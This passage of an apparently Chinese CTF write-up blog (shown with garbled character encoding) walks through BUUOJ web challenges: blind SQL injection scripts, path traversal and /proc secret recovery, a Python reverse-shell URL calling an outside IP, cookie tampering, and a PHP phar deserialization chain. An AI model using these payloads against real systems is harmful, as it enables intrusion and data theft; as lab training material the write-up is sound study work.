sqlè¯­å¥è¿›è¡Œè¯»å–</p><pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*</code></pre><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œ/tmp/html/flag_8946e1ff1ee3e40f.phpçš„flagæ˜¯å‡flagï¼Œè¿˜æ˜¯è¦å½“å½“å‰è¿è¡Œçš„ç½‘ç«™ç›®å½•ä¸‹è¯»å–</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>è€ƒå¯Ÿsqlæ³¨å…¥</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p><p>æœ‰wafï¼Œfuzzä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p><p>å‘ç°å¾ˆå¤šå…³é”®è¯è¢«è¿‡æ»¤äº†</p><p>è€ƒè™‘ç›²æ³¨ï¼Œæµ‹è¯•ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p><p>ç¡®è®¤äº†ç›²æ³¨çš„å­˜åœ¨</p><pre><code>ä¸ºä»€ä¹ˆåŠ ä¸Š||1=1åï¼Œå€¼ä¼šå˜ä¸ºNu1Låå‘¢ï¼Œè¿™é‡Œç‰µæ‰¯åˆ°è¿ç®—é¡ºåºï¼Œè¿™æ˜¯æˆ‘ä¹‹å‰ç™¾æ€ä¸å¾—å…¶è§£çš„ä¸€ç‚¹ï¼Œåé—¨æ‰æƒ³èµ·æ¥</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯”è¾ƒè¿ç®—çš„ä¼˜å…ˆçº§æ˜¯é«˜äºorçš„ï¼Œæ‰€ä»¥ä¼šå…ˆåˆ¤æ–­å³è¾¹çš„å€¼æ˜¯å¦ä¸ºçœŸï¼Œå¦‚æœä¸ºçœŸå°±ä¸ä¼šå†çœ‹å·¦è¾¹äº†ã€‚</p><p>æ€»ä¹‹æˆ‘ä»¬ç¡®å®šäº†è¦ä»ç›²æ³¨å…¥æ‰‹ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªå…³é”®ç‚¹ï¼Œé‚£å°±æ˜¯informationè¿™ä¸ªè¡¨è¢«ç¦ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ä»å…¶ä»–è¡¨ä¸­è·å–æˆ‘ä»¬éœ€è¦çš„å†…å®¹ã€‚</p><p><strong>1.åˆ©ç”¨mysql5.7æ–°å¢çš„sys.schema_auto_increment_columns</strong></p><pre><code> è¿™æ˜¯sysæ•°æ®åº“ä¸‹çš„ä¸€ä¸ªè§†å›¾ï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªä¸information_schema,ä»–çš„ä½œç”¨æ˜¯å¯¹è¡¨çš„è‡ªå¢IDè¿›è¡Œç›‘æ§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸå¼ è¡¨å­˜åœ¨è‡ªå¢IDï¼Œå°±å¯ä»¥é€šè¿‡è¯¥è§†å›¾æ¥è·å–å…¶è¡¨åå’Œæ‰€åœ¨æ•°æ®åº“åä»¥ä¸‹ä¸ºè¯¥è§†å›¾çš„æ‰€æœ‰åˆ—</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p><p><strong>2.sys.schema_table_statistics_with_buffer</strong></p><pre><code> è¿™æ˜¯sysæ•°æ®åº“ä¸‹çš„è§†å›¾ï¼Œé‡Œé¢å­˜å‚¨ç€æ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨çš„ç»Ÿè®¡ä¿¡æ¯  ä¸å®ƒè¡¨ç»“æ„ç›¸ä¼¼çš„è§†å›¾è¿˜æœ‰  sys.x$schema_table_statistics_with_buffer  sys.x$schema_table_statistics  sys.x$ps_schema_table_statistics_ioä»¥ä¸‹ä¸ºè¯¥è§†å›¾çš„å¸¸ç”¨åˆ—ï¼ˆå…¨éƒ¨åˆ—æœ‰å¾ˆå¤šå¾ˆå¤š)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p><p><strong>3.mysqlé»˜è®¤å­˜å‚¨å¼•æ“innoDBæºå¸¦çš„è¡¨</strong></p><pre><code>  mysql.innodb_table_stats  mysql.innodb_index_stats  ä¸¤è¡¨å‡æœ‰database_nameå’Œtable_nameå­—æ®µï¼Œå¯ä»¥åˆ©ç”¨</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p><p>ç›²æ³¨éœ€è¦ç”¨äºŒè¿›åˆ¶è·‘æ‰èƒ½æé«˜æ•ˆç‡ï¼Œè´´ä¸Šå†™çš„ç›²æ³¨è„šæœ¬ï¼Œæˆ‘å¤ªèœäº†å†™ä¸€ä¸ªè¦åŠå¤©æ—¶é—´</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;i = 0result = &#39;&#39;for i in range(1,2000):    min = 32    max = 128    mid = (min + max) // 2    while min &lt; max:        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        if &quot;Error&quot; in res.text:            min = mid + 1        else:            max = mid        mid = (min + max) // 2    result += chr(int(mid))    print(result)    time.sleep(0.5)</code></pre><p>æœ€å¥½çš„åŠæ³•æ˜¯èƒŒä¸‹æ¥æ¨¡æ¿ï¼Œè¿™æ ·çœŸæ­£çš„æ¯”èµ›æ—¶æ‰èƒ½è¾ƒå¿«å†™é¢˜ã€‚</p><p>æœ€ç»ˆå¾—åˆ°ä¸¤ä¸ªè¡¨</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p><p>æ¥ä¸‹æ¥å°±è¦ä»è¡¨ä¸­æ‹¿flag</p><p>ä¸‹é¢è¦ç”¨åˆ°<strong>æ— åˆ—åæ³¨å…¥</strong></p><p>ä¸ºä»€ä¹ˆè¦é‡‡ç”¨è¿™ä¸ªæ³¨å…¥å‘¢ï¼Œæ˜¯å› ä¸ºsys.schema_table_statistics_with_bufferä¸­åªæœ‰è¡¨çš„ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰åˆ—çš„ä¿¡æ¯ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨å¸¸è§„çš„æ–¹æ³•ã€‚</p><p>å…³äºæ— åˆ—åæ³¨å…¥ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p><p>è¿™ä»£è¡¨å­—ç¬¦ä¸²çš„å¤§å°äºé•¿çŸ­æ— å…³ï¼Œè€Œä¸é¦–å­—æ¯(å¦‚æœé¦–å­—æ¯ç›¸åŒåˆ™ç»§ç»­å‘ä¸‹æ¯”å¤§å°)çš„asciiæœ‰å…³</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p><p>ç”±è¿™ä¸ªæˆ‘ä»¬å°±èƒ½æ„é€ å‡ºpayload</p><p>å…ˆæ¥åˆ¤æ–­ä¸‹å­—æ®µ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p><p>ç”±æ­¤å¯åˆ¤æ–­å­—æ®µä¸ºä¸¤ä¸ª</p><p>payload</p><pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></pre><p>ä»£ç :</p><p>æš´åŠ›</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;value = &#39;&#39;def get_flag(char,value):    return value+charfor m in range(1,2000):    for i in range(32,128):        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        time.sleep(0.5)        if &quot;Nu1L&quot; in res.text:            value += chr(i-1)            print(value)            break</code></pre><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p><strong>éé¢„æœŸè§£</strong></p><p>è¿™é¢˜åšçš„å¾ˆå¥‡å¦™ï¼Œï¼Œï¼Œç›´æ¥éé¢„æœŸè§£äº†</p><pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag</code></pre><p>å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼Œæ‹–åˆ°010editorï¼Œflagç›´æ¥å‡ºç°</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p><p><strong>é¢„æœŸè§£</strong></p><p>è¿˜æ˜¯å­¦ä¹ ä¸‹æ­£è§„æ€è·¯å§</p><p>é¦–å…ˆåº”è¯¥è¯»å–ä¸‹è¿›ç¨‹ä¿¡æ¯</p><pre><code>åœ¨/proc æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æ–‡ä»¶  ã€‚ä¸‹é¢æ˜¯/proc ç›®å½•ä¸‹çš„ä¸€äº›é‡è¦æ–‡ä»¶  ï¼š/proc/pid/cmdline  åŒ…å«äº†ç”¨äºå¼€å§‹è¿›ç¨‹çš„å‘½ä»¤  ï¼›/proc/pid/cwd åŒ…å«äº†å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•çš„ä¸€ä¸ªé“¾æ¥  ï¼›/proc/pid/environ  åŒ…å«äº†å¯ç”¨è¿›ç¨‹ç¯å¢ƒå˜é‡çš„åˆ—è¡¨  ï¼›/proc/pid/exe  åŒ…å«äº†æ­£åœ¨è¿›ç¨‹ä¸­è¿è¡Œçš„ç¨‹åºé“¾æ¥ï¼›/proc/pid/fd/  è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ï¼›/proc/pid/mem  åŒ…å«äº†è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼›/proc/pid/stat åŒ…å«äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼›/proc/pid/statm  åŒ…å«äº†è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨ä¿¡æ¯ã€‚ </code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p><p>å¯ä»¥çœ‹åˆ°åˆšå¼€å§‹æ‰§è¡Œäº†</p><pre><code>python2 app.py</code></pre><p>æˆ‘ä»¬æ¥è¯»å–ä¸‹app.pyçš„æºç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p><pre><code class="python">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;/&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;/page&#39;)def page():    url = request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=&#39;application/octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;            return response        else:            value = &quot;HACK ERROR!&quot;    except:        value = &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res=value)@app.route(&#39;/no_one_know_the_manager&#39;)def manager():    key = request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(&quot;shell&quot;)        os.system(shell)        res = &quot;ok&quot;    else:        res = &quot;Wrong Key!&quot;    return resif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>linuxé‡Œå¦‚æœæ²¡æœ‰å…³é—­æ–‡ä»¶ä¼šæ”¾åœ¨å†…å­˜é‡Œï¼Œå°±ç®—ä½ removeæ‰äº†<strong>åœ¨/proc/[pid]/fdä¸‹è¿˜æ˜¯ä¼šä¿å­˜</strong></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p><p>æ‰¾åˆ°äº†å¯†é’¥</p><pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=</code></pre><p>ç»“æœæ˜¯æ— å›æ˜¾rce</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p><p>ä½¿ç”¨åå¼¹shell</p><pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>è¿™é¢˜å¾ˆç®€å•ï¼Œè¿›å»åæˆ‘ä»¬åªæœ‰50å…ƒä½†æ˜¯æœ‰ä¸€ä¸ª100å…ƒçš„æ›²å¥‡</p><p>çŒœæµ‹è´­ä¹°è¿™ä¸ªæ›²å¥‡è·å¾—flag</p><p>ç‚¹å‡»è´­ä¹°å¹¶æŠ“åŒ…</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p><p>seesionå¾ˆåƒbase64åŠ å¯†</p><p>è§£å¯†ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p><p>ä¿®æ”¹ä¸‹moneyç„¶åå†base64åŠ å¯†</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p><p>è´­ä¹°100å…ƒçš„æ›²å¥‡ï¼Œæ›¿æ¢åŸæœ‰çš„cookie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p><p>æˆåŠŸè·å¾—flag</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=</code></pre><p>è§‚å¯Ÿurlï¼Œå¾ˆå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¯»å–ä¸‹å„ä¸ªæ–‡ä»¶æºç </p><p>index.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre><code class="php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;/title&gt;     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt;     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt;         &lt;div class=&quot;container-fluid&quot;&gt;         &lt;div class=&quot;navbar-header&quot;&gt;             &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;é¦–é¡µ&lt;/a&gt;         &lt;/div&gt;             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;         &lt;/div&gt;     &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre><code class="php">é¦–é¡µ    æŸ¥çœ‹æ–‡ä»¶    ä¸Šä¼ æ–‡ä»¶    10.244.80.46&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt;  </code></pre><p>upload_file.php</p><pre><code class="php">222.90.67.205&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt;         &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶å:&lt;/label&gt;     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p>function.php</p><pre><code class="php">222.90.67.205&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; </code></pre><p>æˆ‘ä»¬æ˜¯æ— æ³•åˆ©ç”¨æ–‡ä»¶è¯»å–æ¥è¯»å–flagçš„ã€‚class.phpä¸€çœ‹å°±æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯æ‰€æœ‰çš„ä»£ç é‡Œé¢éƒ½æ²¡æœ‰unserializeæ–¹æ³•ã€‚æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¸”pharåè®®æ²¡æœ‰è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±åº”è¯¥è€ƒå¯Ÿçš„æ˜¯åˆ©ç”¨pharåè®®æ¥è¿›è¡Œååºåˆ—åŒ–é€ƒé€¸ï¼Œé‚£æˆ‘ä»¬å°±è¦å°è¯•æ¥æ„é€ pocé“¾ã€‚</p><p>é¦–å…ˆç¡®å®šç»ˆç‚¹ï¼Œå®ƒåº”è¯¥æ˜¯å¯ä»¥è¯»å–æ–‡ä»¶çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬é”å®šfile_getæ–¹æ³•</p><pre><code>$text = base64_encode(file_get_contents($value));</code></pre><p>æˆ‘ä»¬å°±å¯ä»¥å‘è¿™ä¸ªæ–¹æ³•ä¸­ä¼ å…¥æˆ‘ä»¬éœ€è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„å°±å¯ä»¥äº†ã€‚</p><p>æ€è·¯:</p><pre><code>å¯¹è±¡é”€æ¯ï¼Œè°ƒç”¨__destruct()æ–¹æ³•ï¼Œæœ€åä¼šechoä¸€ä¸ªå€¼ï¼Œä»¤$C1e4r-&gt;str=$Show,è¿™æ ·å°±ä¼šè°ƒç”¨showå¯¹è±¡çš„__toString()æ–¹æ³•ï¼Œå†ä»¤$Show-&gt;str[&#39;str&#39;]=$Test,testå¯¹è±¡ä¸­å¹¶æ²¡æœ‰sourceï¼Œæ‰€ä»¥ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œä»¤Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,å°±å¯ä»¥æˆåŠŸè¯»å–flag</code></pre><p>pocé“¾</p><pre><code class="php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#39;str&#39;]=$test;$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;$phar = new Phar(&quot;sakura.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>åœ¨æœ¬åœ°æ­å»ºphpç¯å¢ƒï¼Œç„¶åè®¿é—®ï¼Œä¼šç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶</p><p><img 